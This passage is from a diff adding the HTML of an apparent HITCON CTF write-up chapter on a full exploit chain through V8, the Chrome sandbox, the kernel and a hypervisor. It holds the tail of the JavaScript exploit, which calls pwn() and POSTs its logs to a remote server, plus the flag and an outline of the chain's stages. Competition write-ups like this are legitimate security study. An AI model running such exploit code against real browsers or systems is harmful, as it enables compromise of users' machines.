+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">print</span><span class="p">(</span><span class="s2">`[-] Exception caught: </span><span class="p">${</span><span class="nx">e</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">stack</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">fetch</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">server_url</span><span class="p">}</span><span class="s2">/logs`</span><span class="p">,{</span>
+    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">body</span><span class="p">:</span> <span class="nx">printbuf</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">),</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nx">pwn</span><span class="p">();</span>
+
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">hitcon{G00dbY3_1_4_O_h3LL0_Pwn_2_Own_BTW_vB0x_Y_U_N0_SM3P_SM4P_??!!}</code></p>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+
+<ul>
+  <li><a href="./fourchain-prologue">Prologue</a>: Introduction</li>
+  <li><a href="./fourchain-hole">Chapter 1: Hole</a>: Using the “hole” to pwn the V8 heap and some delicious Swiss cheese.</li>
+  <li><a href="./fourchain-sandbox">Chapter 2: Sandbox</a>: Pwning the Chrome Sandbox using <code class="language-plaintext highlighter-rouge">Sandbox</code>.</li>
+  <li><a href="./fourchain-kernel">Chapter 3: Kernel</a>: Chaining the Cross-Cache Cred Change</li>
+  <li><a href="./fourchain-hv">Chapter 4: Hypervisor</a>: Lord of the MMIO: A Journey to IEM</li>
+  <li><strong><a href="./fourchain-fullchain">Chapter 5: One for All</a> (You are here)</strong></li>
+  <li><a href="./fourchain-epilogue">Epilogue</a>: Closing thoughts</li>
+</ul>
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>The reason why we use rdx, rax to read but rax, rdx to write is that if the same floating-point constant is used twice in the function, the compiler will emit a load from memory instead of an immediate. So we can’t use the same sequence of instructions twice. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:4" role="doc-endnote">
+      <p>Yeah this is kinda cheating, but then again, the challenge was not made with this in mind and I also had to finish this writeup at some point :P. Also I forgot the command line flag, so if you came here looking for that, sorry :/. <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
